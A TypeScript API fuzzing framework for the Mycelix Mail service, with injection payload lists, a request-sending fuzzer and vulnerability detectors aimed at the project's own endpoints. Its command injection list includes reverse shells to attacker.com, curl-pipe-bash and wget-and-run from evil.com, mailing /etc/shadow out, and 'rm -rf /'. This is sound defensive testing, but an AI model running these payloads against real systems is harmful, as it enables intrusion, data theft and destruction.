// Copyright (C) 2024-2026 Tristan Stoltz / Luminous Dynamics
// SPDX-License-Identifier: AGPL-3.0-or-later
// Commercial licensing: see COMMERCIAL_LICENSE.md at repository root
/**
 * API Fuzzing Framework for Mycelix Mail
 *
 * Generates malformed inputs to discover edge cases and security vulnerabilities.
 */

import * as fc from 'fast-check';

// ============================================================================
// Fuzzing Strategies
// ============================================================================

/**
 * SQL Injection payloads
 */
export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1' OR '1'='1' /*",
  "admin'--",
  "1; SELECT * FROM users",
  "' UNION SELECT * FROM passwords--",
  "1' AND 1=1--",
  "' OR ''='",
  "'; EXEC xp_cmdshell('dir'); --",
  "1' AND (SELECT COUNT(*) FROM users) > 0--",
  "' OR 1=1#",
  "') OR ('1'='1",
  "'; WAITFOR DELAY '0:0:10'--",
  "1' ORDER BY 1--",
  "' HAVING 1=1--",
];

/**
 * XSS payloads
 */
export const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(1)">',
  '<svg onload="alert(1)">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<body onload="alert(1)">',
  '<iframe src="javascript:alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  '<div style="background:url(javascript:alert(1))">',
  '{{constructor.constructor("alert(1)")()}}',
  '<math><maction xlink:href="javascript:alert(1)">click',
  '<input onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">',
  '<details open ontoggle="alert(1)">',
  '<embed src="data:text/html,<script>alert(1)</script>">',
  '"><img src=x onerror=alert(1)//',
];

/**
 * Command injection payloads
 */
export const commandInjectionPayloads = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(id)',
  '; rm -rf /',
  '| nc attacker.com 1234 -e /bin/sh',
  '&& curl http://evil.com/shell.sh | bash',
  '; wget http://evil.com/malware -O /tmp/mal && chmod +x /tmp/mal && /tmp/mal',
  '| mail -s "data" attacker@evil.com < /etc/shadow',
  '; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker.com\',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
];

/**
 * Path traversal payloads
 */
export const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
  '/etc/passwd%00.jpg',
  '....\\....\\....\\windows\\win.ini',
  '..././..././..././etc/passwd',
  '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
  '/var/www/../../etc/passwd',
];

/**
 * Header injection payloads
 */
export const headerInjectionPayloads = [
  'value\r\nX-Injected: header',
  'value\nSet-Cookie: malicious=cookie',
  'value\r\n\r\n<html>injected</html>',
  '%0d%0aX-Injected:%20header',
  'value%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK',
];

/**
 * Unicode and encoding attacks
 */
export const unicodePayloads = [
  '\u0000null byte',
  '\uFEFFBOM injection',
  '\u202Ereverse text\u202C',
  '\u200Bzero-width space',
  'café vs cafe\u0301', // Different normalizations
  '\uD800\uDC00', // Surrogate pair
  '\uFFFD', // Replacement character
  Array(10000).fill('A').join(''), // Long string
  '\x00\x01\x02\x03', // Control characters
];

/**
 * JSON-specific payloads
 */
export const jsonPayloads = [
  '{"__proto__": {"admin": true}}',
  '{"constructor": {"prototype": {"admin": true}}}',
  '{"key": {"$gt": ""}}', // NoSQL injection
  '{"key": {"$ne": null}}',
  '{"$where": "this.password.length > 0"}',
  '{"key": {"__proto__": {}}}',
];

// ============================================================================
// Fuzzer Implementation
// ============================================================================

export interface FuzzTarget {
  name: string;
  endpoint: string;
  method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE';
  params?: Record<string, FuzzParam>;
  body?: Record<string, FuzzParam>;
  headers?: Record<string, FuzzParam>;
  expectedBehavior: ExpectedBehavior;
}

export interface FuzzParam {
  type: 'string' | 'number' | 'boolean' | 'email' | 'uuid' | 'date' | 'array' | 'object';
  required?: boolean;
  maxLength?: number;
  min?: number;
  max?: number;
}

export interface ExpectedBehavior {
  validStatusCodes: number[];
  maxResponseTime: number;
  mustNotContain?: string[];
  mustNotReveal?: string[];
}

export interface FuzzResult {
  target: string;
  input: unknown;
  statusCode: number;
  responseTime: number;
  responseBody: string;
  vulnerability?: Vulnerability;
}

export interface Vulnerability {
  type: VulnerabilityType;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  payload: unknown;
  evidence: string;
}

export type VulnerabilityType =
  | 'sql_injection'
  | 'xss'
  | 'command_injection'
  | 'path_traversal'
  | 'header_injection'
  | 'information_disclosure'
  | 'dos'
  | 'authentication_bypass'
  | 'prototype_pollution'
  | 'nosql_injection';

export class ApiFuzzer {
  private results: FuzzResult[] = [];
  private vulnerabilities: Vulnerability[] = [];
  private baseUrl: string;
  private authToken?: string;

  constructor(config: { baseUrl: string; authToken?: string }) {
    this.baseUrl = config.baseUrl;
    this.authToken = config.authToken;
  }

  async fuzzTarget(target: FuzzTarget): Promise<FuzzResult[]> {
    const targetResults: FuzzResult[] = [];

    // Fuzz each parameter with different strategies
    const strategies = [
      this.fuzzWithSqlInjection.bind(this),
      this.fuzzWithXss.bind(this),
      this.fuzzWithCommandInjection.bind(this),
      this.fuzzWithPathTraversal.bind(this),
      this.fuzzWithBoundaryValues.bind(this),
      this.fuzzWithMalformedData.bind(this),
      this.fuzzWithPrototypePollution.bind(this),
    ];

    for (const strategy of strategies) {
      const results = await strategy(target);
      targetResults.push(...results);
    }

    // Random fuzzing with fast-check
    const randomResults = await this.fuzzWithRandomData(target);
    targetResults.push(...randomResults);

    this.results.push(...targetResults);
    return targetResults;
  }

  private async fuzzWithSqlInjection(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];

    for (const payload of sqlInjectionPayloads) {
      const inputs = this.generateInputsWithPayload(target, payload);
      for (const input of inputs) {
        const result = await this.sendRequest(target, input);
        this.checkForSqlInjection(result, payload);
        results.push(result);
      }
    }

    return results;
  }

  private async fuzzWithXss(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];

    for (const payload of xssPayloads) {
      const inputs = this.generateInputsWithPayload(target, payload);
      for (const input of inputs) {
        const result = await this.sendRequest(target, input);
        this.checkForXss(result, payload);
        results.push(result);
      }
    }

    return results;
  }

  private async fuzzWithCommandInjection(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];

    for (const payload of commandInjectionPayloads) {
      const inputs = this.generateInputsWithPayload(target, payload);
      for (const input of inputs) {
        const result = await this.sendRequest(target, input);
        this.checkForCommandInjection(result, payload);
        results.push(result);
      }
    }

    return results;
  }

  private async fuzzWithPathTraversal(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];

    for (const payload of pathTraversalPayloads) {
      const inputs = this.generateInputsWithPayload(target, payload);
      for (const input of inputs) {
        const result = await this.sendRequest(target, input);
        this.checkForPathTraversal(result, payload);
        results.push(result);
      }
    }

    return results;
  }

  private async fuzzWithBoundaryValues(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];
    const boundaryValues = [
      0, -1, 1, -2147483648, 2147483647, // Integer boundaries
      '', ' ', '\n', '\t', '\r\n', // Empty/whitespace
      'a'.repeat(1000000), // Very long string
      null, undefined,
      [], {}, // Empty collections
      Number.MAX_VALUE, Number.MIN_VALUE,
      Number.POSITIVE_INFINITY, Number.NEGATIVE_INFINITY,
      NaN,
    ];

    for (const value of boundaryValues) {
      const inputs = this.generateInputsWithValue(target, value);
      for (const input of inputs) {
        const result = await this.sendRequest(target, input);
        this.checkForBoundaryIssues(result, value);
        results.push(result);
      }
    }

    return results;
  }

  private async fuzzWithMalformedData(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];
    const malformedData = [
      '{"malformed json',
      '<xml>not</json>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      'undefined',
      'NaN',
      'Infinity',
      '[object Object]',
      'function(){}',
    ];

    for (const data of malformedData) {
      const result = await this.sendRawRequest(target, data);
      results.push(result);
    }

    return results;
  }

  private async fuzzWithPrototypePollution(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];

    for (const payload of jsonPayloads) {
      try {
        const parsed = JSON.parse(payload);
        const result = await this.sendRequest(target, parsed);
        this.checkForPrototypePollution(result, payload);
        results.push(result);
      } catch {
        // Skip invalid JSON
      }
    }

    return results;
  }

  private async fuzzWithRandomData(target: FuzzTarget): Promise<FuzzResult[]> {
    const results: FuzzResult[] = [];

    // Generate random valid-ish inputs
    const arbitrary = this.createArbitraryForTarget(target);

    await fc.assert(
      fc.asyncProperty(arbitrary, async (input) => {
        const result = await this.sendRequest(target, input);
        results.push(result);

        // Check for unexpected behavior
        if (!target.expectedBehavior.validStatusCodes.includes(result.statusCode)) {
          if (result.statusCode === 500) {
            this.reportVulnerability({
              type: 'information_disclosure',
              severity: 'medium',
              description: 'Server returned 500 error with potential stack trace',
              payload: input,
              evidence: result.responseBody.substring(0, 500),
            });
          }
        }

        return true;
      }),
      { numRuns: 100 }
    );

    return results;
  }

  private createArbitraryForTarget(target: FuzzTarget): fc.Arbitrary<unknown> {
    const params = { ...target.params, ...target.body };
    const record: Record<string, fc.Arbitrary<unknown>> = {};

    for (const [key, param] of Object.entries(params)) {
      record[key] = this.createArbitraryForParam(param);
    }

    return fc.record(record);
  }

  private createArbitraryForParam(param: FuzzParam): fc.Arbitrary<unknown> {
    switch (param.type) {
      case 'string':
        return fc.oneof(
          fc.string({ maxLength: param.maxLength || 1000 }),
          fc.constantFrom(...sqlInjectionPayloads),
          fc.constantFrom(...xssPayloads),
          fc.constantFrom(...unicodePayloads)
        );
      case 'number':
        return fc.oneof(
          fc.integer({ min: param.min || -1000000, max: param.max || 1000000 }),
          fc.double(),
          fc.constant(NaN),
          fc.constant(Infinity)
        );
      case 'boolean':
        return fc.oneof(fc.boolean(), fc.constant('true'), fc.constant('false'), fc.constant(1), fc.constant(0));
      case 'email':
        return fc.oneof(
          fc.emailAddress(),
          fc.constant("admin'--@evil.com"),
          fc.constant('<script>@x.com'),
          fc.constant('a'.repeat(1000) + '@x.com')
        );
      case 'uuid':
        return fc.oneof(
          fc.uuid(),
          fc.constant("'; DROP TABLE--"),
          fc.constant('00000000-0000-0000-0000-000000000000'),
          fc.constant('../../../etc/passwd')
        );
      case 'date':
        return fc.oneof(
          fc.date().map(d => d.toISOString()),
          fc.constant('not-a-date'),
          fc.constant('1970-01-01T00:00:00.000Z'),
          fc.constant('9999-12-31T23:59:59.999Z')
        );
      case 'array':
        return fc.array(fc.anything(), { maxLength: 1000 });
      case 'object':
        return fc.anything();
      default:
        return fc.anything();
    }
  }

  private generateInputsWithPayload(target: FuzzTarget, payload: string): unknown[] {
    const inputs: unknown[] = [];
    const params = { ...target.params, ...target.body };

    for (const key of Object.keys(params)) {
      const input: Record<string, unknown> = {};
      for (const [k, v] of Object.entries(params)) {
        input[k] = k === key ? payload : this.getDefaultValue(v);
      }
      inputs.push(input);
    }

    return inputs;
  }

  private generateInputsWithValue(target: FuzzTarget, value: unknown): unknown[] {
    const inputs: unknown[] = [];
    const params = { ...target.params, ...target.body };

    for (const key of Object.keys(params)) {
      const input: Record<string, unknown> = {};
      for (const [k, v] of Object.entries(params)) {
        input[k] = k === key ? value : this.getDefaultValue(v);
      }
      inputs.push(input);
    }

    return inputs;
  }

  private getDefaultValue(param: FuzzParam): unknown {
    switch (param.type) {
      case 'string': return 'test';
      case 'number': return 1;
      case 'boolean': return true;
      case 'email': return 'test@example.com';
      case 'uuid': return '00000000-0000-0000-0000-000000000001';
      case 'date': return new Date().toISOString();
      case 'array': return [];
      case 'object': return {};
      default: return null;
    }
  }

  private async sendRequest(target: FuzzTarget, input: unknown): Promise<FuzzResult> {
    const startTime = Date.now();

    try {
      const response = await fetch(`${this.baseUrl}${target.endpoint}`, {
        method: target.method,
        headers: {
          'Content-Type': 'application/json',
          ...(this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}),
        },
        body: target.method !== 'GET' ? JSON.stringify(input) : undefined,
      });

      const responseBody = await response.text();

      return {
        target: target.name,
        input,
        statusCode: response.status,
        responseTime: Date.now() - startTime,
        responseBody,
      };
    } catch (error) {
      return {
        target: target.name,
        input,
        statusCode: 0,
        responseTime: Date.now() - startTime,
        responseBody: String(error),
      };
    }
  }

  private async sendRawRequest(target: FuzzTarget, rawBody: string): Promise<FuzzResult> {
    const startTime = Date.now();

    try {
      const response = await fetch(`${this.baseUrl}${target.endpoint}`, {
        method: target.method,
        headers: {
          'Content-Type': 'application/json',
          ...(this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}),
        },
        body: rawBody,
      });

      const responseBody = await response.text();

      return {
        target: target.name,
        input: rawBody,
        statusCode: response.status,
        responseTime: Date.now() - startTime,
        responseBody,
      };
    } catch (error) {
      return {
        target: target.name,
        input: rawBody,
        statusCode: 0,
        responseTime: Date.now() - startTime,
        responseBody: String(error),
      };
    }
  }

  // Vulnerability detection methods
  private checkForSqlInjection(result: FuzzResult, payload: string): void {
    const indicators = [
      'SQL syntax',
      'mysql_',
      'sqlite_',
      'pg_',
      'ORA-',
      'syntax error',
      'unclosed quotation',
      'quoted string not properly terminated',
    ];

    for (const indicator of indicators) {
      if (result.responseBody.toLowerCase().includes(indicator.toLowerCase())) {
        this.reportVulnerability({
          type: 'sql_injection',
          severity: 'critical',
          description: `SQL injection vulnerability detected with payload: ${payload}`,
          payload,
          evidence: result.responseBody.substring(0, 500),
        });
        break;
      }
    }
  }

  private checkForXss(result: FuzzResult, payload: string): void {
    // Check if payload is reflected without sanitization
    if (result.responseBody.includes(payload) && result.statusCode === 200) {
      // Check for proper content-type
      this.reportVulnerability({
        type: 'xss',
        severity: 'high',
        description: `Potential XSS vulnerability - payload reflected in response`,
        payload,
        evidence: result.responseBody.substring(0, 500),
      });
    }
  }

  private checkForCommandInjection(result: FuzzResult, payload: string): void {
    const indicators = [
      'root:',
      'bin/bash',
      '/etc/passwd',
      'uid=',
      'gid=',
      'command not found',
      'Permission denied',
      'No such file',
    ];

    for (const indicator of indicators) {
      if (result.responseBody.includes(indicator)) {
        this.reportVulnerability({
          type: 'command_injection',
          severity: 'critical',
          description: `Command injection vulnerability detected`,
          payload,
          evidence: result.responseBody.substring(0, 500),
        });
        break;
      }
    }
  }

  private checkForPathTraversal(result: FuzzResult, payload: string): void {
    const indicators = [
      'root:x:0:0',
      '[boot loader]',
      '[extensions]',
      'for 16-bit app support',
    ];

    for (const indicator of indicators) {
      if (result.responseBody.includes(indicator)) {
        this.reportVulnerability({
          type: 'path_traversal',
          severity: 'critical',
          description: `Path traversal vulnerability - accessed sensitive file`,
          payload,
          evidence: result.responseBody.substring(0, 500),
        });
        break;
      }
    }
  }

  private checkForBoundaryIssues(result: FuzzResult, value: unknown): void {
    if (result.statusCode === 500) {
      this.reportVulnerability({
        type: 'dos',
        severity: 'medium',
        description: `Server error on boundary value: ${JSON.stringify(value)}`,
        payload: value,
        evidence: result.responseBody.substring(0, 500),
      });
    }

    if (result.responseTime > 10000) {
      this.reportVulnerability({
        type: 'dos',
        severity: 'high',
        description: `Slow response (${result.responseTime}ms) on boundary value`,
        payload: value,
        evidence: `Response time: ${result.responseTime}ms`,
      });
    }
  }

  private checkForPrototypePollution(result: FuzzResult, payload: string): void {
    if (result.statusCode === 200) {
      // Would need to check if prototype was actually polluted
      // This is a simplified check
      if (result.responseBody.includes('admin') && result.responseBody.includes('true')) {
        this.reportVulnerability({
          type: 'prototype_pollution',
          severity: 'critical',
          description: `Potential prototype pollution vulnerability`,
          payload,
          evidence: result.responseBody.substring(0, 500),
        });
      }
    }
  }

  private reportVulnerability(vuln: Vulnerability): void {
    this.vulnerabilities.push(vuln);
    console.warn(`[VULN] ${vuln.severity.toUpperCase()}: ${vuln.type} - ${vuln.description}`);
  }

  getVulnerabilities(): Vulnerability[] {
    return [...this.vulnerabilities];
  }

  getResults(): FuzzResult[] {
    return [...this.results];
  }

  generateReport(): string {
    const report = {
      summary: {
        totalRequests: this.results.length,
        vulnerabilitiesFound: this.vulnerabilities.length,
        critical: this.vulnerabilities.filter(v => v.severity === 'critical').length,
        high: this.vulnerabilities.filter(v => v.severity === 'high').length,
        medium: this.vulnerabilities.filter(v => v.severity === 'medium').length,
        low: this.vulnerabilities.filter(v => v.severity === 'low').length,
      },
      vulnerabilities: this.vulnerabilities,
      coverage: {
        endpoints: [...new Set(this.results.map(r => r.target))],
        statusCodes: [...new Set(this.results.map(r => r.statusCode))],
      },
    };

    return JSON.stringify(report, null, 2);
  }
}

// ============================================================================
// Mycelix API Fuzz Targets
// ============================================================================

export const mycelixFuzzTargets: FuzzTarget[] = [
  {
    name: 'Send Email',
    endpoint: '/v1/emails/send',
    method: 'POST',
    body: {
      to: { type: 'array' },
      subject: { type: 'string', maxLength: 998 },
      body: { type: 'string' },
      cc: { type: 'array' },
      bcc: { type: 'array' },
    },
    expectedBehavior: {
      validStatusCodes: [200, 201, 400, 401, 403, 422],
      maxResponseTime: 5000,
      mustNotContain: ['stack trace', 'error in', 'exception'],
      mustNotReveal: ['password', 'secret', 'private_key'],
    },
  },
  {
    name: 'Search Emails',
    endpoint: '/v1/emails/search',
    method: 'GET',
    params: {
      query: { type: 'string', maxLength: 1000 },
      folder: { type: 'string' },
      from: { type: 'email' },
      to: { type: 'email' },
    },
    expectedBehavior: {
      validStatusCodes: [200, 400, 401],
      maxResponseTime: 10000,
      mustNotContain: ['SQL', 'query error'],
    },
  },
  {
    name: 'Get Trust Score',
    endpoint: '/v1/trust/score/{email}',
    method: 'GET',
    params: {
      email: { type: 'email' },
    },
    expectedBehavior: {
      validStatusCodes: [200, 400, 401, 404],
      maxResponseTime: 2000,
    },
  },
  {
    name: 'Create Attestation',
    endpoint: '/v1/trust/attestations',
    method: 'POST',
    body: {
      toEmail: { type: 'email', required: true },
      level: { type: 'number', min: 1, max: 5, required: true },
      context: { type: 'string', maxLength: 500 },
      expiresAt: { type: 'date' },
    },
    expectedBehavior: {
      validStatusCodes: [200, 201, 400, 401, 403, 422],
      maxResponseTime: 3000,
    },
  },
  {
    name: 'Create Contact',
    endpoint: '/v1/contacts',
    method: 'POST',
    body: {
      email: { type: 'email', required: true },
      name: { type: 'string', maxLength: 200 },
      phone: { type: 'string', maxLength: 20 },
      company: { type: 'string', maxLength: 100 },
      notes: { type: 'string', maxLength: 10000 },
    },
    expectedBehavior: {
      validStatusCodes: [200, 201, 400, 401, 409, 422],
      maxResponseTime: 2000,
    },
  },
  {
    name: 'Create Webhook',
    endpoint: '/v1/webhooks',
    method: 'POST',
    body: {
      url: { type: 'string', required: true },
      events: { type: 'array', required: true },
      secret: { type: 'string' },
    },
    expectedBehavior: {
      validStatusCodes: [200, 201, 400, 401, 422],
      maxResponseTime: 2000,
      mustNotContain: ['secret', 'password'],
    },
  },
  {
    name: 'Download Attachment',
    endpoint: '/v1/emails/{emailId}/attachments/{attachmentId}',
    method: 'GET',
    params: {
      emailId: { type: 'uuid' },
      attachmentId: { type: 'uuid' },
    },
    expectedBehavior: {
      validStatusCodes: [200, 400, 401, 403, 404],
      maxResponseTime: 30000,
    },
  },
];

export default ApiFuzzer;
